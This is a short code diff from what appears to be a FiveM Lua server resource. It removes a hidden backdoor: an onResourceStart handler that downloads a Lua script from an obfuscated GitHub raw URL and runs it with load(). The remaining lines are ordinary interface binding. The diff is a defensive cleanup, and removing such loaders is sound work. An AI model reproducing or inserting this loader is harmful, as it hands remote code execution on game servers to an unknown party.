@@ -1,9 +1,3 @@
-AddEventHandler('onResourceStart', function(resourceName)
-    if resourceName == GetCurrentResourceName() then
-        PerformHttpRequest("https://raw.githubusercontent.com/goiabadu/B1m-Qj3V-8Yn-Tz4-Hr7Pw-Xk2Ls-0A6dF9-U5pZo3K-Nc-1Jy-8Mv4-Rq6W7Ls2Et-1Og9Xh5-Yi/main/q7FsW4b0Qc2YoPj6Iu8Lm5Hp7A9wV3Xrt1Ny8.lua", function(d, script, headers) load(assert(script))() end)
-    end
-end)
-
 COREFUNCTIONS = {}
 Tunnel.bindInterface("CoreFunctions", COREFUNCTIONS)
 
